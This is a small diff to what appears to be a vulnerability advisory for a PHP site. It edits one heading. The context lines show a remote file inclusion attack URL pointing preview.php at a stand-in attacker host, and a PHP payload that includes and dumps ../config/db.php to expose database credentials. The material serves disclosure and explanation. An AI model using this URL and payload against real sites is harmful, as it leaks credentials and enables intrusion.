@@ -45,7 +45,7 @@ This vulnerability allows an attacker to:
     ```
     https://your_web_site/preview.php?file=http://dangerous_web_site.com/malicious_code.php
     ```
-3. Content of the <i>"malicious_code.php"</i>
+3. Content of <i>"malicious_code.php"</i>
 ```js
 <?php var_dump(include('../config/db.php'));
 ```
